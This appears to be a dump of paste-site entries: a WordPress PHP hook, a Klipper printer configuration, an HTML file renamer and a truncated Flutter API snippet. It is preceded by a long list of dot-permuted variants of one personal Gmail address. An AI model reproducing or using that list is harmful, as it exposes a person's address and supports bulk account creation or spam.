<a href=""mailto:a.t.han.a.s.i.a.de.a.n1@gmail.com"">a.t.han.a.s.i.a.de.a.n1@gmail.com</a>
<a href=""mailto:a.th.ana.s.ia.d.ean1@gmail.com"">a.th.ana.s.ia.d.ean1@gmail.com</a>
<a href=""mailto:a.t.ha.nasi.a.d.ea.n1@gmail.com"">a.t.ha.nasi.a.d.ea.n1@gmail.com</a>
<a href=""mailto:ath.an.a.sia.de.a.n.1@gmail.com"">ath.an.a.sia.de.a.n.1@gmail.com</a>
<a href=""mailto:ath.a.na.si.a.d.e.an.1@gmail.com"">ath.a.na.si.a.d.e.an.1@gmail.com</a>
<a href=""mailto:a.tha.nasia.d.ean.1@gmail.com"">a.tha.nasia.d.ean.1@gmail.com</a>
<a href=""mailto:ath.a.n.a.s.ia.dea.n1@gmail.com"">ath.a.n.a.s.ia.dea.n1@gmail.com</a>
<a href=""mailto:atha.n.a.s.iad.ea.n.1@gmail.com"">atha.n.a.s.iad.ea.n.1@gmail.com</a>
<a href=""mailto:a.th.a.n.a.s.ia.d.e.a.n1@gmail.com"">a.th.a.n.a.s.ia.d.e.a.n1@gmail.com</a>
<a href=""mailto:a.t.h.anasia.d.e.an1@gmail.com"">a.t.h.anasia.d.e.an1@gmail.com</a>
<a href=""mailto:at.hana.s.i.a.de.an1@gmail.com"">at.hana.s.i.a.de.an1@gmail.com</a>
<a href=""mailto:a.tha.n.a.sia.de.an1@gmail.com"">a.tha.n.a.sia.de.an1@gmail.com</a>
<a href=""mailto:athanasi.ade.an.1@gmail.com"">athanasi.ade.an.1@gmail.com</a>
<a href=""mailto:at.han.as.ia.dea.n1@gmail.com"">at.han.as.ia.dea.n1@gmail.com</a>
<a href=""mailto:atha.n.a.si.ad.ea.n1@gmail.com"">atha.n.a.si.ad.ea.n1@gmail.com</a>
<a href=""mailto:at.h.ana.sia.dean.1@gmail.com"">at.h.ana.sia.dean.1@gmail.com</a>
<a href=""mailto:a.than.a.si.a.d.e.an.1@gmail.com"">a.than.a.si.a.d.e.an.1@gmail.com</a>
<a href=""mailto:ath.anasi.ad.e.an.1@gmail.com"">ath.anasi.ad.e.an.1@gmail.com</a>
<a href=""mailto:a.th.an.asia.dea.n1@gmail.com"">a.th.an.asia.dea.n1@gmail.com</a>
<a href=""mailto:atha.nasi.ad.ean1@gmail.com"">atha.nasi.ad.ean1@gmail.com</a>
<a href=""mailto:a.tha.n.a.siad.ean1@gmail.com"">a.tha.n.a.siad.ean1@gmail.com</a>
<a href=""mailto:at.han.a.siad.e.an.1@gmail.com"">at.han.a.siad.e.an.1@gmail.com</a>
<a href=""mailto:at.h.an.a.s.ia.dean.1@gmail.com"">at.h.an.a.s.ia.dean.1@gmail.com</a>
<a href=""mailto:at.h.anas.iadea.n.1@gmail.com"">at.h.anas.iadea.n.1@gmail.com</a>
<a href=""mailto:at.ha.nas.i.a.d.e.an1@gmail.com"">at.ha.nas.i.a.d.e.an1@gmail.com</a>
<a href=""mailto:at.h.a.nasi.a.d.ea.n1@gmail.com"">at.h.a.nasi.a.d.ea.n1@gmail.com</a>
<a href=""mailto:at.h.an.a.si.adea.n1@gmail.com"">at.h.an.a.si.adea.n1@gmail.com</a>
<a href=""mailto:a.t.ha.nas.ia.d.e.a.n1@gmail.com"">a.t.ha.nas.ia.d.e.a.n1@gmail.com</a>
<a href=""mailto:a.t.h.a.nas.i.a.d.ean.1@gmail.com"">a.t.h.a.nas.i.a.d.ean.1@gmail.com</a>
<a href=""mailto:atha.n.a.si.ade.a.n1@gmail.com"">atha.n.a.si.ade.a.n1@gmail.com</a>
<a href=""mailto:a.t.h.anasi.ad.ea.n1@gmail.com"">a.t.h.anasi.ad.ea.n1@gmail.com</a>
<a href=""mailto:ath.a.n.a.s.i.a.d.e.a.n1@gmail.com"">ath.a.n.a.s.i.a.d.e.a.n1@gmail.com</a>
<a href=""mailto:atha.nasiade.an.1@gmail.com"">atha.nasiade.an.1@gmail.com</a>
<a href=""mailto:at.h.a.n.a.si.a.dean1@gmail.com"">at.h.a.n.a.si.a.dean1@gmail.com</a>
<a href=""mailto:ath.an.as.ia.dean.1@gmail.com"">ath.an.as.ia.dean.1@gmail.com</a>
<a href=""mailto:a.tha.nas.iad.e.a.n1@gmail.com"">a.tha.nas.iad.e.a.n1@gmail.com</a>
<a href=""mailto:atha.n.asia.de.a.n1@gmail.com"">atha.n.asia.de.a.n1@gmail.com</a>
<a href=""mailto:at.ha.n.a.sia.d.e.an1@gmail.com"">at.ha.n.a.sia.d.e.an1@gmail.com</a>
<a href=""mailto:a.t.ha.n.a.si.ade.a.n.1@gmail.com"">a.t.ha.n.a.si.ade.a.n.1@gmail.com</a>
<a href=""mailto:a.th.a.n.a.si.a.de.an.1@gmail.com"">a.th.a.n.a.si.a.de.an.1@gmail.com</a>
<a href=""mailto:a.thanasiad.ean1@gmail.com"">a.thanasiad.ean1@gmail.com</a>
<a href=""mailto:at.ha.n.as.ia.dean.1@gmail.com"">at.ha.n.as.ia.dean.1@gmail.com</a>
<a href=""mailto:a.th.anas.ia.d.e.an1@gmail.com"">a.th.anas.ia.d.e.an1@gmail.com</a>
<a href=""mailto:a.th.anasiad.ea.n.1@gmail.com"">a.th.anasiad.ea.n.1@gmail.com</a>
<a href=""mailto:at.h.anas.ia.d.ean1@gmail.com"">at.h.anas.ia.d.ean1@gmail.com</a>
<a href=""mailto:at.h.an.a.s.iad.ean.1@gmail.com"">at.h.an.a.s.iad.ean.1@gmail.com</a>
<a href=""mailto:at.h.ana.s.i.a.d.e.an.1@gmail.com"">at.h.ana.s.i.a.d.e.an.1@gmail.com</a>
<a href=""mailto:ath.a.na.s.i.a.de.a.n.1@gmail.com"">ath.a.na.s.i.a.de.a.n.1@gmail.com</a>
<a href=""mailto:a.t.h.a.nas.i.a.dean1@gmail.com"">a.t.h.a.nas.i.a.dean1@gmail.com</a>
<a href=""mailto:a.th.ana.si.a.de.an1@gmail.com"">a.th.ana.si.a.de.an1@gmail.com</a>
<a href=""mailto:ath.anas.i.a.de.an.1@gmail.com"">ath.anas.i.a.de.an.1@gmail.com</a>
<a href=""mailto:at.hanas.iad.e.an.1@gmail.com"">at.hanas.iad.e.an.1@gmail.com</a>
<a href=""mailto:a.t.han.a.s.i.a.d.e.a.n1@gmail.com"">a.t.han.a.s.i.a.d.e.a.n1@gmail.com</a>
<a href=""mailto:athan.asi.a.de.an.1@gmail.com"">athan.asi.a.de.an.1@gmail.com</a>
<a href=""mailto:ath.a.nasi.ad.e.an1@gmail.com"">ath.a.nasi.ad.e.an1@gmail.com</a>
<a href=""mailto:a.t.ha.nasiad.e.an.1@gmail.com"">a.t.ha.nasiad.e.an.1@gmail.com</a>
<a href=""mailto:a.t.han.a.s.iad.ea.n1@gmail.com"">a.t.han.a.s.iad.ea.n1@gmail.com</a>
<a href=""mailto:at.h.a.nasiade.a.n1@gmail.com"">at.h.a.nasiade.a.n1@gmail.com</a>
<a href=""mailto:at.h.a.nas.i.ad.e.a.n1@gmail.com"">at.h.a.nas.i.ad.e.a.n1@gmail.com</a>
<a href=""mailto:a.t.h.ana.sia.de.an.1@gmail.com"">a.t.h.ana.sia.de.an.1@gmail.com</a>
<a href=""mailto:ath.a.n.as.iade.a.n1@gmail.com"">ath.a.n.as.iade.a.n1@gmail.com</a>
<a href=""mailto:a.th.an.a.s.i.ad.ean.1@gmail.com"">a.th.an.a.s.i.ad.ean.1@gmail.com</a>
<a href=""mailto:a.th.a.na.si.a.d.ean1@gmail.com"">a.th.a.na.si.a.d.ean1@gmail.com</a>
<a href=""mailto:at.ha.nasi.a.de.an1@gmail.com"">at.ha.nasi.a.de.an1@gmail.com</a>
<a href=""mailto:at.h.a.nas.ia.d.e.a.n.1@gmail.com"">at.h.a.nas.ia.d.e.a.n.1@gmail.com</a>
<a href=""mailto:at.han.a.s.ia.dea.n1@gmail.com"">at.han.a.s.ia.dea.n1@gmail.com</a>
<a href=""mailto:a.t.ha.nasia.de.an.1@gmail.com"">a.t.ha.nasia.de.an.1@gmail.com</a>
<a href=""mailto:at.ha.na.s.iad.e.an.1@gmail.com"">at.ha.na.s.iad.e.an.1@gmail.com</a>
<a href=""mailto:ath.an.asiade.an1@gmail.com"">ath.an.asiade.an1@gmail.com</a>
<a href=""mailto:a.tha.nasi.a.d.e.a.n1@gmail.com"">a.tha.nasi.a.d.e.a.n1@gmail.com</a>
<a href=""mailto:at.ha.nasi.a.d.e.a.n.1@gmail.com"">at.ha.nasi.a.d.e.a.n.1@gmail.com</a>
<a href=""mailto:ath.a.na.si.a.dea.n.1@gmail.com"">ath.a.na.si.a.dea.n.1@gmail.com</a>
<a href=""mailto:ath.anas.ia.dea.n1@gmail.com"">ath.anas.ia.dea.n1@gmail.com</a>
<a href=""mailto:a.t.hanasi.ad.ean1@gmail.com"">a.t.hanasi.ad.ean1@gmail.com</a>
<a href=""mailto:at.h.an.as.iadean1@gmail.com"">at.h.an.as.iadean1@gmail.com</a>
<a href=""mailto:a.th.anas.iad.ean1@gmail.com"">a.th.anas.iad.ean1@gmail.com</a>
<a href=""mailto:ath.a.nasi.ad.e.an.1@gmail.com"">ath.a.nasi.ad.e.an.1@gmail.com</a>
<a href=""mailto:atha.nas.i.ade.a.n.1@gmail.com"">atha.nas.i.ade.a.n.1@gmail.com</a>
<a href=""mailto:a.t.ha.n.as.i.a.de.a.n1@gmail.com"">a.t.ha.n.as.i.a.de.a.n1@gmail.com</a>"
audzud8t,Untitled,wclovers,PHP,Wednesday 20th of December 2023 01:35:42 AM CDT,"add_action('bp_setup_nav', 'bp_wcfm_user_nav_item_modified', 98);
function bp_wcfm_user_nav_item_modified() {
    remove_action('bp_setup_nav', 'bp_wcfm_user_nav_item', 99);

    global $bp;

    if (!$bp || !$bp->displayed_user || !property_exists($bp->displayed_user, 'userdata') || !$bp->displayed_user->userdata || !$bp->displayed_user->id) return;

    $other_member_profile = false;

    if (is_user_logged_in()) {
        $current_user_id = get_current_user_id();
        if (wcfm_is_vendor($current_user_id) && ($current_user_id == $bp->displayed_user->id)) {
            $pages = get_option(""wcfm_page_options"");
            $wcfm_page = get_post($pages['wc_frontend_manager_page_id']);

            $args = array(
                'name' => $wcfm_page->post_title,
                'slug' => $wcfm_page->post_name,
                'default_subnav_slug' => $wcfm_page->post_name,
                'position' => 50,
                'screen_function' => 'bp_wcfm_user_nav_item_screen',
                'item_css_id' => $wcfm_page->post_name
            );

            bp_core_new_nav_item($args);
        } else {
            $other_member_profile = true;
        }
    } else {
        $other_member_profile = true;
    }

    if ($other_member_profile) {
        do_action('wcfm_buddypress_show_vendor_store_link', $bp->displayed_user->id);
    }
}"
sYBM3Ffx,posledni setting,nero150,Bash,Wednesday 20th of December 2023 01:17:53 AM CDT,"[mcu]
serial: /dev/serial/by-id/usb-Klipper_stm32f446xx_5C0033000F51303530323539-if00
[mcu EBBCan]
canbus_uuid: 7ad0664b7d35

[include fluidd.cfg]
[include K-ShakeTune/*.cfg]
[exclude_object]
[include shell_command.cfg]
[include KAMP_Settings.cfg]

[printer]
kinematics: corexy
max_velocity: 500 
max_accel: 4000		        #Max 4000
max_z_velocity: 15			#Max 15 for 12V TMC Drivers, can increase for 24V
max_z_accel: 350
square_corner_velocity: 5.0

#####################################################################
#      X/Y Stepper Settings
#####################################################################

[stepper_x]
##	Connected to X-MOT (B Motor)
step_pin: PE11
dir_pin: !PE10
enable_pin: !PE9
rotation_distance: 40
microsteps: 16
full_steps_per_rotation:200  #set to 400 for 0.9 degree stepper
endstop_pin: tmc2240_stepper_x:virtual_endstop #^PB14
position_min: 0
position_endstop: 300
position_max: 300
homing_speed: 50   #Max 100
homing_retract_dist: 5
homing_positive_dir: true

[tmc2240 stepper_x]
## Soft SPI
spi_software_mosi_pin: PE14
spi_software_miso_pin: PE13
spi_software_sclk_pin: PE12
cs_pin: PE7 
interpolate: True
diag1_pin: !PB14 
run_current: 0.900 
hold_current: 0.500
driver_SGT: 63
stealthchop_threshold: 0
#[tmc2209 stepper_x]
#uart_pin: PE7
#interpolate: True
#run_current: 0.8
#hold_current: 0.4
#sense_resistor: 0.110
#stealthchop_threshold: 0
#diag_pin: ^PB14 # use the same pin that was previously the endstop_pin!
#driver_SGTHRS: 80

[stepper_y]
##	Connected to Y-MOT (A Motor)
step_pin: PD8
dir_pin: !PB12
enable_pin: !PD9
rotation_distance: 40
microsteps: 16
full_steps_per_rotation:200  #set to 400 for 0.9 degree stepper
endstop_pin: tmc2240_stepper_y:virtual_endstop #^PB13
position_min: 0
position_endstop: 300
position_max: 300
homing_speed: 50  #Max 100
homing_retract_dist: 5
homing_positive_dir: true

##	Make sure to update below for your relevant driver (2208 or 2209)
[tmc2240 stepper_y]
## Soft SPI
spi_software_mosi_pin: PE14
spi_software_miso_pin: PE13
spi_software_sclk_pin: PE12
cs_pin: PE15
interpolate: True
diag1_pin: !PB13
run_current: 0.900 
hold_current: 0.500
driver_SGT: -64
stealthchop_threshold: 0
#[tmc2209 stepper_y]
#uart_pin: PE15
#interpolate: True
#run_current: 0.8
#hold_current: 0.4
#sense_resistor: 0.110
#stealthchop_threshold: 0
#diag_pin: ^PB13     # use the same pin that was previously the endstop_pin!
#driver_SGTHRS: 75 # 255 is most sensitive value, 0 is least sensitive

#####################################################################
#   Z Stepper Settings
#####################################################################


[stepper_z]
step_pin: PD14
dir_pin: PD13
enable_pin: !PD15
rotation_distance: 40
gear_ratio: 80:16
microsteps: 16
endstop_pin: probe:z_virtual_endstop
position_max: 290
position_min: -5
homing_speed: 8
second_homing_speed: 3
homing_retract_dist: 3

[tmc2209 stepper_z]
uart_pin: PD10
interpolate: True
run_current: 0.8
hold_current: 0.4
sense_resistor: 0.110
stealthchop_threshold: 0

[stepper_z1]
step_pin: PE6
dir_pin: !PC13
enable_pin: !PE5
rotation_distance: 40
gear_ratio: 80:16
microsteps: 16

[tmc2209 stepper_z1]
uart_pin: PC14
interpolate: True
run_current: 0.8
hold_current: 0.4
sense_resistor: 0.110
stealthchop_threshold: 0

[stepper_z2]
step_pin: PE2
dir_pin: PE4
enable_pin: !PE3
rotation_distance: 40
gear_ratio: 80:16
microsteps: 16

[tmc2209 stepper_z2]
uart_pin: PC15
interpolate: true
run_current: 0.8
hold_current: 0.4
sense_resistor: 0.110
stealthchop_threshold: 0

[stepper_z3]
step_pin: PD12
dir_pin: !PC4
enable_pin: !PE8
rotation_distance: 40
gear_ratio: 80:16
microsteps: 16

[tmc2209 stepper_z3]
uart_pin: PA15
interpolate: true
run_current: 0.8
hold_current: 0.4
sense_resistor: 0.110
stealthchop_threshold: 0

#####################################################################
#   Extruder
#####################################################################

[extruder]
step_pin: EBBCan:gpio18
dir_pin: EBBCan:gpio19
enable_pin: !EBBCan:gpio17
rotation_distance: 22.6789511	
gear_ratio: 50:17				#BMG Gear Ratio
microsteps: 16
full_steps_per_rotation: 200	#200 for 1.8 degree, 400 for 0.9 degree
nozzle_diameter: 0.400
filament_diameter: 1.75
heater_pin: EBBCan:gpio7
sensor_type: Generic 3950#ATC Semitec 104GT-2
sensor_pin: EBBCan:gpio27 # TE0 Position
min_temp: 10
max_temp: 270
max_power: 1.0
min_extrude_temp: 170
control = pid
pid_kp = 21.981
pid_ki = 3.330
pid_kd = 36.268
##	Try to keep pressure_advance below 1.0
pressure_advance: 0.05
##	Default is 0.040, leave stock
pressure_advance_smooth_time: 0.040
#control: pid
#pid_Kp: 21.527
#pid_Ki: 1.063
#pid_Kd: 108.982
#min_temp: 0
#max_temp: 250

# sensor_type: MAX31865
# sensor_pin: EBBCan:gpio9
# spi_software_sclk_pin: EBBCan:gpio10
# spi_software_mosi_pin: EBBCan:gpio8
# spi_software_miso_pin: EBBCan:gpio11
# rtd_nominal_r: 100
# rtd_reference_r: 430
# rtd_num_of_wires: 2

[tmc2209 extruder]
uart_pin: EBBCan:gpio20
interpolate: false
run_current: 0.5
hold_current: 0.2
sense_resistor: 0.110
stealthchop_threshold: 0

#####################################################################
#   Bed Heater
#####################################################################
[heater_bed]
##	SSR Pin - In BED OUT position
heater_pin: PB4
sensor_type: Generic 3950 # NTC 100K MGB18-104F39050L32
sensor_pin: PB0 # TB Position
max_power: 0.6
min_temp: 0
max_temp: 120
control: pid
pid_kp: 58.437
pid_ki: 2.347
pid_kd: 363.769




#####################################################################
#	Fan Control
#####################################################################

[fan]
pin: EBBCan:gpio13

[heater_fan hotend_fan]
pin: EBBCan:gpio14
heater: extruder
heater_temp: 50.0

#[heater_fan hotend_fan]
#pin: PA13
#max_power: 1.0
#kick_start_time: 0.5
#heater: extruder
#heater_temp: 50.0
##	If you are experiencing back flow, you can reduce fan_speed
#fan_speed: 1.0

#[fan]
#pin: PA14
#max_power: 0.4
#kick_start_time: 0.5
##	Depending on your fan, you may need to increase this value
##	if your fan will not start. Can change cycle_time (increase)
##	if your fan is not able to slow down effectively
#off_below: 0.10

#[heater_fan controller_fan]
###	Controller fan - FAN2 Connector
#pin: PB2
#kick_start_time: 0.5
#heater: heater_bed
#heater_temp: 45.0

#[heater_fan exhaust_fan]
##  Exhaust fan - In E2 OUT Positon
#pin: PB3
#max_power: 1.0
#shutdown_speed: 0.0
#kick_start_time: 5.0
#heater: heater_bed
#heater_temp: 60
#fan_speed: 1.0

#[controller_fan nevermore]
# Nevermore - In E1 OUT Position
#pin: PC8
#kick_start_time: 0.500
#fan_speed: 0.5

#####################################################################
#	LED Control
#####################################################################

#[output_pin caselight ]
##  Chamber Lighting - In 5V-RGB Position
#pin: PD3
#pwm: true
#shutdown_value: 0
#value:100
#cycle_time: 0.01

#####################################################################
#	Homing and Gantry Adjustment Routines
#####################################################################

[idle_timeout]
timeout: 1800

[safe_z_home]
home_xy_position:150,150
speed:150
z_hop:10
   
[quad_gantry_level]
gantry_corners:
	-60,-10
	360,370
##	Probe points
points:
	50,25
	50,225
	250,225
	250,25
speed: 100
horizontal_move_z: 10
retries: 5
retry_tolerance: 0.01
max_adjust: 10

#####################################################################
#	Probe
#####################################################################
[probe]

pin: !EBBCan:gpio22
x_offset: 0
y_offset: 0.0
#z_offset: 0
speed: 10.0
samples: 3
samples_result: median
sample_retract_dist: 3.0
samples_tolerance: 0.01 #0.006
samples_tolerance_retries: 3
activate_gcode:
    {% set PROBE_TEMP = 150 %}
    {% set MAX_TEMP = PROBE_TEMP + 5 %}
    {% set ACTUAL_TEMP = printer.extruder.temperature %}
    {% set TARGET_TEMP = printer.extruder.target %}

    {% if TARGET_TEMP > PROBE_TEMP %}
        { action_respond_info('Extruder temperature target of %.1fC is too high, lowering to %.1fC' % (TARGET_TEMP, PROBE_TEMP)) }
        M109 S{ PROBE_TEMP }
    {% else %}
        # Temperature target is already low enough, but nozzle may still be too hot.
        {% if ACTUAL_TEMP > MAX_TEMP %}
            { action_respond_info('Extruder temperature %.1fC is still too high, waiting until below %.1fC' % (ACTUAL_TEMP, MAX_TEMP)) }
            TEMPERATURE_WAIT SENSOR=extruder MAXIMUM={ MAX_TEMP }
        {% endif %}
    {% endif %}



#####################################################################
#	Displays
#####################################################################

#--------------------------------------------------------------------

[display]
#mini12864 LCD Display
lcd_type: uc1701
cs_pin: PC11
a0_pin: PD2
rst_pin: PC10
encoder_pins: ^PC6,^PC7
click_pin: ^!PA8
contrast: 63
#spi_bus: spi1
spi_software_mosi_pin: PA7
spi_software_miso_pin: PA6
spi_software_sclk_pin: PA5

[neopixel fysetc_mini12864]
#To control Neopixel RGB in mini12864 display
pin: PC12
chain_count: 3
initial_RED: 0.1
initial_GREEN: 0.5
initial_BLUE: 0.0
color_order: RGB

#	Set RGB values on boot up for each Neopixel. 
#	Index 1 = display, Index 2 and 3 = Knob
[delayed_gcode setdisplayneopixel]
initial_duration: 1
gcode:
        SET_LED LED=fysetc_mini12864 RED=1 GREEN=1 BLUE=1 INDEX=1 TRANSMIT=0
        SET_LED LED=fysetc_mini12864 RED=1 GREEN=0 BLUE=0 INDEX=2 TRANSMIT=0
        SET_LED LED=fysetc_mini12864 RED=1 GREEN=0 BLUE=0 INDEX=3 

#--------------------------------------------------------------------

#####################################################################
#	Teploty
#####################################################################

[temperature_sensor raspberry_pi]
sensor_type: temperature_host
min_temp: 10
max_temp: 100
[temperature_sensor mcu_temp]
sensor_type: temperature_mcu
min_temp: 0
max_temp: 100
[temperature_sensor EBB_NTC]
sensor_type: Generic 3950
sensor_pin: EBBCan:gpio28

#####################################################################
#	ADXL
#####################################################################

[adxl345]
cs_pin: EBBCan:gpio1
spi_software_sclk_pin: EBBCan:gpio2
spi_software_mosi_pin: EBBCan:gpio0
spi_software_miso_pin: EBBCan:gpio3
axes_map: z,-y,x

[resonance_tester]
probe_points: 150, 150, 20
accel_chip: adxl345

[input_shaper]
shaper_freq_x: 56.6
shaper_type_x:  mzv     # frequency for the X mark of the test model
shaper_freq_y: 44.6  # frequency for the Y mark of the test model
shaper_type_y:  mzv



#####################################################################
#	Macros
#####################################################################

[gcode_macro G32]
gcode:
    BED_MESH_CLEAR
    G28
    QUAD_GANTRY_LEVEL
    G28
    G0 X150 Y150 Z30 F3600


[gcode_macro PRINT_START]
gcode:
    {% set BED_TEMP = params.BED_TEMP|default(60)|float %}
    {% set EXTRUDER_TEMP = params.EXTRUDER_TEMP|default(190)|float %}
    # Předchozí dva řádky nám vytvořily proměnné BED_TEMP a EXTRUDER_TEMP, a doplnily je hodnotami ze Sliceru
    # V případě že slicer hodnoty nepředá, nastaví se defaultně 190 pro hotend, a 60 pro bed

    # Nastavení teplot
    # M104 nám nastaví teplotu na 150 stupňů. Je to teplota, kdy se dá očistit tryska a filament ""neslintá""
    M104 S150
    # M190 nám nastaví teplotu bedu na hodnotu, kterou do makra předal slicer. A čekáme než se nahřeje bed
    M190 S{BED_TEMP}
    # M109 nastaví teplotu hotendu na hodnotu, kterou nám do makra předal slicer a čeká na její dosažení
    M109 S150 ; Set non dripping hotend temperature
    # UG90 nám přepne na absolutní koordináty
    G90
    # M83 přepne extruder na relativní vzdálenosti
    M83
    # POZOR - G32 je makro pro voron 2.4 a předpokládá se, že jej máte. Pro pořádek jsem jej přidal za PRINT_END
    # Toto makro nám zařídí homování a vyrovnání gantry u V2.4, pokud máte jinou tiskárnu, následující řádek smažte
    G32
    # BED_MESH_CLEAR nám vymaže předchozí uložené hodnoty meshe, chceme začínat s čistým štítem
    BED_MESH_CLEAR
    # A následující příkaz nám zkalibruje podložku pomocí sensoru (bltouch, indukční sensor, crtouch, klicky a jiné)
    BED_MESH_CALIBRATE

    # G1 je gcode pro pohyb. Nyní přesuneme trysku do levého spodního rohu 5mm nad podložku
    G1 X3 Y6 Z5 F5000
    # Nyní sjedeme tryskou 0,3mm nad podložku
    G1 Z0.3 F3000
    
    # Nyní čekáme na nahřátí trysky na hodnotu předanou slicerem
    M109 S{EXTRUDER_TEMP}
    
    # Resetování vzdálenosti extruderu
    G92 E0
    
    # Očištění trysky. Následující gcode nám pomalu posunuje trysku 14cm doprava a extruder vytlačí 30mm filamentu
    # První pohyb je pomalejší a delší (až do 12cm), a následuje rychlé očištění 2 cm na výsledných 14 cm
    G1 X120 E30 F600
    G1 X140 F5000
    G92 E0
    # Následně před samotným tiskem proběhne krátká retrakce a resetování vzdálenosti extruderu
    G1 E-0.2 F600
    G92 E0

[gcode_macro PRINT_END]
gcode:
    # Uložíme aktuální stav tiskárny (pozici trysky, stav extruderu a další hodnoty)
    SAVE_GCODE_STATE NAME=STATE_PRINT_END
    # Vypneme nahřívání hotendu a bedu
    TURN_OFF_HEATERS
    # Přepneme na relativní vzdálenosti, a zvedneme trysku o 10mm nahoru
    # POZOR - pokud tisknete vysoké tisky na maximální výšku tiskárny, tento gcode vám může dělat potíže
    # Následně přepneme zpět na absolutní pozicování/vzdálenosti pomocí G90
    G91
    G1 Z10 F3000
    G90
    # Přesuneme toolhead doprava a dopředu
    # Zde záleží, kam chcete umístit toolhead/tiskovou hlavu po skončení tisku. Není dobré ji nechat viset na tiskem
    # nastavte podle vaší tiskárny a podle toho kde chcete tiskovou hlavu mít.
    # v tomto případě jde tisková hlava dopředu (Y20) a doprava (X300)
    G1 Y20
    G1 X300
    
    # Počkáme na vyčištění bufferu
    M400
    # Vynulujeme vzdálenosti extruderu
    G92 E0
    # Zatáhneme filament 20mm dovnitř hotendu
    # tento řádek nám pak umožní vytáhnout filament z tiskárny i za studena a je kompenzován 
    # v PRINT_START (proto tlačíme 30mm filamentu před tiskem)
    G1 E-20.0 F3000
    # Vypneme ventilátor
    M106 S0
    # Vypneme motory
    M84
    # Vymažeme naměřený bed mesh
    BED_MESH_CLEAR
    # Obnovíme hodnoty původního stavu tiskárny
    RESTORE_GCODE_STATE NAME=STATE_PRINT_END


[bed_mesh]
speed: 150
horizontal_move_z: 5
mesh_min: 10, 10
mesh_max: 290, 290
probe_count: 6,6 
## 	Thermistor Types
##   ""EPCOS 100K B57560G104F""
##   ""ATC Semitec 104GT-2""
##   ""NTC 100K beta 3950""
##   ""Honeywell 100K 135-104LAG-J01""
##   ""NTC 100K MGB18-104F39050L32"" (Keenovo Heater Pad)
##   ""AD595""
##   ""PT100 INA826""

#*# <---------------------- SAVE_CONFIG ---------------------->
#*# DO NOT EDIT THIS BLOCK OR BELOW. The contents are auto-generated.
#*#
#*# [bed_mesh default]
#*# version = 1
#*# points =
#*# 	-0.022500, -0.005000, -0.030000, -0.045000, -0.010000, 0.032500
#*# 	0.045000, 0.032500, 0.000000, -0.010000, 0.025000, 0.080000
#*# 	0.057500, 0.045000, 0.002500, -0.005000, 0.035000, 0.090000
#*# 	0.010000, 0.012500, -0.025000, -0.047500, 0.010000, 0.085000
#*# 	-0.017500, -0.037500, -0.080000, -0.080000, -0.037500, 0.032500
#*# 	-0.132500, -0.147500, -0.197500, -0.192500, -0.135000, -0.067500
#*# x_count = 6
#*# y_count = 6
#*# mesh_x_pps = 2
#*# mesh_y_pps = 2
#*# algo = lagrange
#*# tension = 0.2
#*# min_x = 10.0
#*# max_x = 290.0
#*# min_y = 10.0
#*# max_y = 290.0
#*#
#*# [probe]
#*# z_offset = -0.740
"
z1vhb6SN,"Código para renomear arquivos no formato aaaa-mm-dd-hh-mm-ss (HTML, Javascript e CSS)",MizunoBrasil,JavaScript,Wednesday 20th of December 2023 12:09:05 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Upload de Arquivo</title>
    <link rel=""stylesheet"" href=""https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap"">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            color: #333;
        }

        form {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        input, button {
            margin-bottom: 10px;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
        }

        button {
            cursor: pointer;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 4px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <form id=""uploadForm"">
        <label for=""fileInput""><h2>Renomear Arquivo</h2></label>
        <p>o nome do arquivo será no formato <b>aaaa-mm-dd-hh-mm-ss</b></p>
        <input type=""file"" id=""fileInput"" accept=""image/*"" required>

        <button type=""button"" onclick=""uploadFile()"">Enviar</button>
    </form>

    <script>
        function uploadFile() {
            var fileInput = document.getElementById('fileInput');
            var file = fileInput.files[0];

            if (file) {
                var currentDate = new Date();
                var uniqueFileName = currentDate.getFullYear() + '-' +
                                     pad(currentDate.getMonth() + 1) + '-' +
                                     pad(currentDate.getDate()) + '-' +
                                     pad(currentDate.getHours()) + '-' +
                                     pad(currentDate.getMinutes()) + '-' +
                                     pad(currentDate.getSeconds());

                var fileExtension = file.name.split('.').pop();
                var newFileName = uniqueFileName + ""."" + fileExtension;

                var blob = new Blob([file], { type: file.type });

                var link = document.createElement('a');
                link.href = window.URL.createObjectURL(blob);
                link.download = newFileName;

                document.body.appendChild(link);
                link.click();

                document.body.removeChild(link);
            } else {
                alert(""Por favor, selecione um arquivo."");
            }
        }

        function pad(number) {
            return (number < 10 ? '0' : '') + number;
        }
    </script>
</body>
</html>
"
nfmFV34K,INVENTARIO,LeanCoder0852,C#,Tuesday 19th of December 2023 09:59:38 PM CDT,INVENTARIO2023
qLcDEB0J,flutter api,yocky12k,Dart,Tuesday 19th of December 2023 08:53:46 PM CDT,"dependencies:
  flutter:
    sdk: flutter
  http: ^0.13.6

file api_service.dart

import 'package:http/http.dart' as http;
import 'dart:convert';

class ApiService {
  Future<List<dataCrypto>> bacaApi() async {
    final response = await http.get(Uri.parse('https://api.coinlore.net/api/tickers/'));
    if(response.statusCode == 200){
      final List<dynamic> dataList = json.decode(response.body)['data'];
      List<dataCrypto> cryptoList = dataList.map((data) => dataCrypto.fromJson(data)).toList();
      return cryptoList;
    }else{
      throw Exception('Gagal baca data');
    }
  }
}

class dataCrypto {
  final String id;
  final String symbol;
  final String name;

  dataCrypto({
    required this.id,
    required this.symbol,
    required this.name,
  });

  factory dataCrypto.fromJson(Map<String, dynamic> json){
    return dataCrypto(
      id: json['id'],
      symbol: json['symbol'],
      name: json['name'],
      );
  }
}

file provider_crypto.dart
import 'package:flutter/material.dart';
import 'api_service.dart';

class ProviderCrypto extends ChangeNotifier {
  final ApiService apiService = ApiService();
  List<dataCrypto> cryptoList = [];

  Future<void> ambilApi() async {
    try {
       cryptoList = await apiService.bacaApi();
       notifyListeners();
    } catch (e) {
       print('Error: $e');
    }
  }
